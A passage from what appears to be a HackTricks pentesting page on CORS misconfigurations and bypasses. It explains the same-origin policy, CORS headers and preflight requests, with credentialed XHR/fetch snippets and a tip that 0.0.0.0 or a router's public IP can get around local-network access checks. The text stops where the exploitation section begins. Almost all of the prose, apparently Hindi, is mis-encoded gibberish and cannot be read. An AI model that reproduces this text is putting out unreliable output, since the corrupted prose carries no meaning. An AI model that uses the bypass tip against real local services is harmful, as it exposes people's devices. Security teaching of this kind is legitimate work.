# CORS - Misconfigurations & Bypass

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## CORS рдХреНрдпрд╛ рд╣реИ?

рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рд░рд┐рд╕реЛрд░реНрд╕ рд╢реЗрдпрд░рд┐рдВрдЧ (CORS) рдорд╛рдирдХ **рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЙрдирдХреЗ рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рддрдХ рдХреМрди рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ **рдХрд┐рд╕ HTTP рдЕрдиреБрд░реЛрдз рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ** рдпрд╣ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

рдПрдХ **рд╕рдорд╛рди-рдореВрд▓** рдиреАрддрд┐ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдПрдХ **рд╕рд░реНрд╡рд░ рдЬреЛ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд░рд╣рд╛ рд╣реИ** рдФрд░ рд╕рдВрд╕рд╛рдзрди рдХреЛ **рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╕рд░реНрд╡рд░** рдПрдХ рд╣реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (рдЬреИрд╕реЗ, `http://`), рдбреЛрдореЗрди рдирд╛рдо (рдЬреИрд╕реЗ, `internal-web.com`), рдФрд░ **рдкреЛрд░реНрдЯ** (рдЬреИрд╕реЗ, 80) рд╕рд╛рдЭрд╛ рдХрд░рддреЗ рд╣реЛрдВред рдЗрд╕ рдиреАрддрд┐ рдХреЗ рддрд╣рдд, рдХреЗрд╡рд▓ рд╡реЗрдм рдкреГрд╖реНрда рдЬреЛ рдПрдХ рд╣реА рдбреЛрдореЗрди рдФрд░ рдкреЛрд░реНрдЯ рд╕реЗ рд╣реЛрдВ, рдЙрдиреНрд╣реЗрдВ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

`http://normal-website.com/example/example.html` рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ рдХрд╛ рдЕрдиреБрдкрд╛рд▓рди рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рд╣реИ:

| рдПрдХреНрд╕реЗрд╕ рдХреА рдЧрдИ URL                         | рдПрдХреНрд╕реЗрд╕ рдХреА рдЕрдиреБрдорддрд┐?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | рд╣рд╛рдБ: рдПрдХ рд╣реА рдпреЛрдЬрдирд╛, рдбреЛрдореЗрди, рдФрд░ рдкреЛрд░реНрдЯ |
| `http://normal-website.com/example2/`     | рд╣рд╛рдБ: рдПрдХ рд╣реА рдпреЛрдЬрдирд╛, рдбреЛрдореЗрди, рдФрд░ рдкреЛрд░реНрдЯ |
| `https://normal-website.com/example/`     | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдпреЛрдЬрдирд╛ рдФрд░ рдкреЛрд░реНрдЯ           |
| `http://en.normal-website.com/example/`   | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди                    |
| `http://www.normal-website.com/example/`  | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди                    |
| `http://normal-website.com:8080/example/` | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдкреЛрд░реНрдЯ\*                    |

\*рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ рдХреЛ рдкреНрд░рд╡рд░реНрддрд┐рдд рдХрд░рддреЗ рд╕рдордп рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### `Access-Control-Allow-Origin` рд╣реЗрдбрд░

рдпрд╣ рд╣реЗрдбрд░ **рдПрдХрд╛рдзрд┐рдХ рдореВрд▓реЛрдВ**, **`null`** рдорд╛рди, рдпрд╛ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб **`*`** рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдХреЛрдИ рднреА рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХрд╛рдзрд┐рдХ рдореВрд▓реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛**, рдФрд░ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб `*` рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реАрдорд╛рдУрдВ** рдХреЗ рдЕрдзреАрди рд╣реИред (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЛ рдЕрдХреЗрд▓реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ `Access-Control-Allow-Credentials: true` рдХреЗ рд╕рд╛рде рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред)

рдпрд╣ рд╣реЗрдбрд░ **рдПрдХ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдПрдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рд░рдВрднрд┐рдд рдПрдХ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рд╕рдВрд╕рд╛рдзрди рдЕрдиреБрд░реЛрдз рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, рдЬрд┐рд╕рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ `Origin` рд╣реЗрдбрд░ рдЬреЛрдбрд╝рддрд╛ рд╣реИред

### `Access-Control-Allow-Credentials` рд╣реЗрдбрд░

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рдХреБрдХреА рдпрд╛ рдСрдерд░рд╛рдЗрдЬреЗрд╢рди рд╣реЗрдбрд░ рдЬреИрд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рдмрд┐рдирд╛ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдлрд┐рд░ рднреА, рдЬрдм рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рд╕рд░реНрд╡рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ `Access-Control-Allow-Credentials` рд╣реЗрдбрд░ рдХреЛ **`true`** рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

рдЕрдЧрд░ `true` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ (рдХреБрдХреАрдЬрд╝, рдСрдерд░рд╛рдЗрдЬреЗрд╢рди рд╣реЗрдбрд░, рдпрд╛ TLS рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ) рднреЗрдЬреЗрдЧрд╛ред
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз

### рдкрд╛рд░-рдбреЛрдореЗрди рд╕рдВрдЪрд╛рд░ рдореЗрдВ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХреА рд╕рдордЭ

рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рддрд╣рдд рдПрдХ рдкрд╛рд░-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рд░рдВрдн рдХрд░рддреЗ рд╕рдордп, рдЬреИрд╕реЗ рдХрд┐ **рдЧреИрд░-рдорд╛рдирдХ HTTP рд╡рд┐рдзрд┐** (HEAD, GET, POST рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреБрдЫ рднреА), рдирдП **рд╣реЗрдбрд░** рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛, рдпрд╛ рд╡рд┐рд╢реЗрд╖ **Content-Type рд╣реЗрдбрд░ рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛, рддреЛ рдПрдХ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрд╣ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз, **`OPTIONS`** рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рд╕рд░реНрд╡рд░ рдХреЛ рдЖрдЧрд╛рдореА рдкрд╛рд░-рд╕реНрд░реЛрдд рдЕрдиреБрд░реЛрдз рдХреА рдЗрдЪреНрдЫрд╛рдУрдВ рдХреА рд╕реВрдЪрдирд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ HTTP рд╡рд┐рдзрд┐рдпрд╛рдБ рдФрд░ рд╣реЗрдбрд░ред
**рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рд╕рд╛рдЭрд╛рдХрд░рдг (CORS)** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЗрд╕ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЬрд╛рдВрдЪ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдиреБрд░реЛрдзрд┐рдд рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдСрдкрд░реЗрд╢рди рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рд╡рд┐рдзрд┐рдпреЛрдВ, рд╣реЗрдбрд░реНрд╕, рдФрд░ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИред рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдШрдЯрд╛рдиреЗ рд╡рд╛рд▓реА рд╢рд░реНрддреЛрдВ рдХреЛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП, [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╡реНрдпрд╛рдкрдХ рдЧрд╛рдЗрдб рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдВред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдЬрд╡рд╛рдм рдореЗрдВ рдЕрдзрд┐рдХреГрддреА рд╣реЗрдбрд░реНрд╕ рд▓реЗ рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдирд╣реАрдВ рдЦрд╛рд░рд┐рдЬ рдХрд░рддреА**ред рдЗрди рд╣реЗрдбрд░реНрд╕ рдХреЗ рдмрд┐рдирд╛, рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рд╕реЗ рдЖрдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЬрд╡рд╛рдм рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рдмрдирд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

`PUT` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░ рдирд╛рдорд┐рдд `Special-Request-Header` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
рдЬрд╡рд╛рдм рдореЗрдВ, рд╕рд░реНрд╡рд░ рдорд╛рди рд╕рдХрддрд╛ рд╣реИ рд╣реЗрдбрд░реНрд╕ рд╡рд╛рдкрд╕ рдХрд░рдирд╛ рдЬреЛ рд╕реНрд╡реАрдХреГрдд рдореЗрдердбреНрд╕, рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рдореВрд▓, рдФрд░ рдЕрдиреНрдп CORS рдиреАрддрд┐ рд╡рд┐рд╡рд░рдг рджрд┐рдЦрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: рдпрд╣ рд╣реЗрдбрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз рдХреЗ рджреМрд░рд╛рди рдХреМрди рд╕реЗ рд╣реЗрдбрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕рд╕реЗ рд╕реНрдкрд╖реНрдЯ рд╣реЛ рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рдХреМрди рд╕реЗ рд╣реЗрдбрд░реНрд╕ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред
* **`Access-Control-Expose-Headers`**: рдЗрд╕ рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рд╕рд░реНрд╡рд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ рд╣реЗрдбрд░реНрд╕ рдХреЛ рд╕рд░рд▓ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░реНрд╕ рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд рднрд╛рдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **`Access-Control-Max-Age`**: рдпрд╣ рд╣реЗрдбрд░ рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЛ рдХрд┐рддрдиреА рджреЗрд░ рддрдХ рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╕рд░реНрд╡рд░ рдЙрд╕ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рдХреЛ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ, рд╕реЗрдХрдВрдб рдореЗрдВ, рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рджреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **`Access-Control-Request-Headers`**: рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рд╣реЗрдбрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдХреМрди рд╕реЗ HTTP рд╣реЗрдбрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рдЙрд╕реЗ рд╕рд░реНрд╡рд░ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **`Access-Control-Request-Method`**: рдпрд╣ рд╣реЗрдбрд░, рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рд╣реЗрдбрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдХреМрди рд╕рд╛ HTTP рд╡рд┐рдзрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕реЗ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред
* **`Origin`**: рдпрд╣ рд╣реЗрдбрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкрд╛рд░-рдореВрд▓ рд╕рдВрд╡рд╛рдж рдХреА рдореВрд▓ рд╕реНрдерд╛рди рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЙрдиреНрд╣реЗрдВ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рдЕрдиреБрд░реЛрдз рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП рдпрд╛ рдЗрд╕реЗ рдирдХрд╛рд░рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП CORS рдиреАрддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ред
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд▓рд┐рдирдХреНрд╕ **0.0.0.0** рдЖрдИрдкреА рд▓реЛрдХрд▓рд╣реЛрд╕реНрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдпреЗ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ **рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдИрдкреА рдкрддрд╛ "рд╕реНрдерд╛рдиреАрдп" рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реНрдерд╛рдиреАрдп рдЕрдВрддрдмрд┐рдВрджреБ (рдЬреИрд╕реЗ рд░рд╛рдЙрдЯрд░ рдХрд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА) рдХрд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА рдкрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдХрдИ рдЕрд╡рд╕реНрдерд╛рдУрдВ рдореЗрдВ, рдпрджрд┐ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА** рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрджрд┐ рдпрд╣ **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ** рд╕реЗ рд╣реИ, рддреЛ рдкрд╣реБрдВрдЪ рджреА рдЬрд╛рдПрдЧреАред
{% endhint %}

## рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрдмрд▓ рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

рдпрд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ `Access-Control-Allow-Credentials` рдХреЛ **`true`** рд╕реЗрдЯ рдХрд░рдирд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣рдорд▓реЛрдВ** рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рд╣рдорд▓реЗ рдХреА рдкреНрд░рднрд╛рд╡рдХрд╛рд░рд┐рддрд╛ рдХреЛ рдмрдврд╝рд╛рддреА рд╣реИред рдЗрд╕рдХреЗ рдмрд┐рдирд╛, 